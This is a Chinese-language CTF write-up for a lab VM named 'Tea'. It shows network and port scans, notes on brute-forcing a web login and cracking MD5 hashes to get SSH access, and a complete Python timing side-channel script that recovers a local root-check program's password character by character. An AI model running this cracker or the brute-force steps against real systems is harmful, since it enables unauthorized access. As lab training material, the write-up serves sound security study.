---
title: Self-VM Tea复盘
author: LingMj
data: 2025-06-06
categories: [Self-VM]
tags: [upload]
description: 难度-Low
---

## 网段扫描
```
root@LingMj:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.14	62:2f:e8:e4:77:5d	(Unknown: locally administered)
192.168.137.168	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.202	a0:78:17:62:e5:0a	Apple, Inc.
```

## 端口扫描

```
root@LingMj:~# nmap -p- -sC -sV 192.168.137.168
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 06:16 EDT
Nmap scan report for Tea.mshome.net (192.168.137.168)
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Tea.dsz | \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE6\xA0\xBC\xE8\xA8\x80
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds
```

## 获取webshell

![picture 0](../assets/images/cd3b3dbff32c25e748e1ef4e9abe266d02e9475641a499bc5d5dc62c8813d97e.png)  
![picture 1](../assets/images/69c8c9bed1af96dbd6cb3f95ce9e1c2c1662dca20f543cc1799d29ba81f52430.png)  
![picture 2](../assets/images/1e396dc099894df9dd01f8b74175318d9a9bb8246ab084f51740ed46525db629.png)  

>不知道要不要写域名先写了
>

![picture 3](../assets/images/ea805b20db9a7dfa73d88b900441208f8882214f57e98bfacbe63e26a8208dad.png)  
![picture 4](../assets/images/699e56cf42039760a437b93597d679a5221b8e8da6b23a359c203b1dc966ea46.png)  

>提取人名
>

![picture 5](../assets/images/28f0dab7a2d7a018b737d69166b351faebd663c91bac71bce2748c0fec7bcc1b.png)  

>没有啥区别看来不是这个方案
>

![picture 6](../assets/images/b193c1cc68e5dd3b1b3b771b3492e67db8091f63f4753be171a2bb43bc368562.png)  

>一直提示输入正确邮箱地址看来有点难找
>

![picture 7](../assets/images/c1c0dc852293be06c5ca43a69b45ff25a34e68cc3e1270a802d3ea3982d3dc18.png)  
![picture 8](../assets/images/4924c1c15cf9f42a24f2ddbb74c374cc59692394aeeecf683e3c057766c85a8c.png)  

>没有消息回显，看看udp,也不是直接注入post
>

![picture 9](../assets/images/498ceea54976b75c5f9b3a52a46eaba49d5d146340d2e79a59ad56619d8dbe81.png)  

>没有咋整呢
>

![picture 10](../assets/images/addfc954a41431b032c5c0d6e219fbb2c4a9b86ecd29eff562f38f4951b0c082.png)  

>暴力开锁哈哈哈，跑完10万个密码
>

![picture 11](../assets/images/0015205de62fcc8a77704e7110a3ac12665a11365fea569b6a6bb26f27ae0b81.png)  
![picture 12](../assets/images/8df50b93829563beee7f4cc8812e8d4bfe5195291cba9a3f9d4517af54b3db91.png)  

>🤔看来这个admin还不是要的用户看看能越不,发现不能但是我要拿到lingmj这个用户，验证码那个邮箱咋填不懂
>

![picture 13](../assets/images/b86436474f68fc6f2fbb976606139fb34aee57eea1e0e2d7f5aa9e6427bf9c23.png)  

>找到邮箱
>

![picture 14](../assets/images/c089eff3b9a794cbfbe35dd84bd5e0d64ba001ede4cd240e359d4dfc28ed3659.png)  

>密码是没有的
>

![picture 15](../assets/images/30188475b747c2f441d621a8f80772ad24c4bdff1a94843876dd90009346353a.png)  
![picture 16](../assets/images/3234ba6581d51b64b4b8098cc7faea54796ce81455b9303bf7db5cfa8ed69684.png)  

>这个是md5 	1234hak54321 123bugme 	Cartman
>

![picture 17](../assets/images/59527e00d6cae22a5f0e1b3b8fc19a26d67f23e6476ee92b35dddf209816a6d5.png)  

>可以登录ssh了
>

## 提权

![picture 18](../assets/images/d4020ebf9ff0be66a8579217588b6eb353e813dc28c370c259d4704cf652afbf.png)  

>不过主要的不是在这个里/opt有一个检查root的程序那个才是提权关键但是无法看
>

>截止了，看完wp了，这个程序我想错了，就只是求密码，不过肯定有时间，最后爆破出来是toddzhannb一共11位，不过这些都是假设不知道的
>

![picture 19](../assets/images/4cf8dc4873fac8f941ce8734c09e9d2d8402f2fba127e3f0a7e64c8176d92411.png)  

>没啥用目测肯定不是这个方法,现在ai一直改也没有正确，我可以考虑用一下第一个大佬gdb的方案，看完更懵逼了算了学习答案方案
>

![picture 20](../assets/images/14a7fa69332cefd78c086a7bab9918cf6f7113fac6134054e22a7d084d278488.png)  

>正确是没有回显的
>

```
import subprocess
import sys
import time
import string

TARGET_PROGRAM = "./a.out"
MAX_LENGTH = 100
INITIAL_DELAY = 0.2
CHAR_DELAY = 0.05
TIMING_MARGIN = 0.01
ATTEMPTS = 2
DETECT_THRESHOLD = 0.15
CHARSET = string.ascii_lowercase + string.digits

def run_password_test(password):
    start_time = time.perf_counter()
    process = subprocess.Popen(
        [TARGET_PROGRAM, password],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    _, _ = process.communicate()
    return time.perf_counter() - start_time

def detect_length():
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = 'a' * length
        total_time = 0
        for _ in range(ATTEMPTS):
            elapsed = run_password_test(test_pwd)
            total_time += elapsed
        avg_time = total_time / ATTEMPTS
        
        if avg_time >= DETECT_THRESHOLD:
            return length
    
    print("Password length not found (1-100)")
    sys.exit(1)

def crack_password(password_length):
    known = ""
    
    for position in range(password_length):
        max_time = 0
        best_char = None
        
        for char in CHARSET:
            test_pwd = known + char + 'x' * (password_length - len(known) - 1)
            
            current_time = 0
            for _ in range(ATTEMPTS):
                elapsed = run_password_test(test_pwd)
                if elapsed > current_time:
                    current_time = elapsed
            
            print(f"Testing '{char}': {current_time:.4f}s")
            
            if current_time > max_time:
                max_time = current_time
                best_char = char
        
        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY
        if abs(max_time - expected_time) > TIMING_MARGIN:
            print(f"Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)")
        
        known += best_char
        print(f"Progress: {known}")
    
    return known

if __name__ == "__main__":
    print("Starting password cracker...")
    print("Detecting password length...")
    password_length = detect_length()
    print(f"Password length detected: {password_length}")
    password = crack_password(password_length)
    print(f"\nPassword found: {password}")
```

>好了先到这里吧
>

>userflag:
>
>rootflag:
>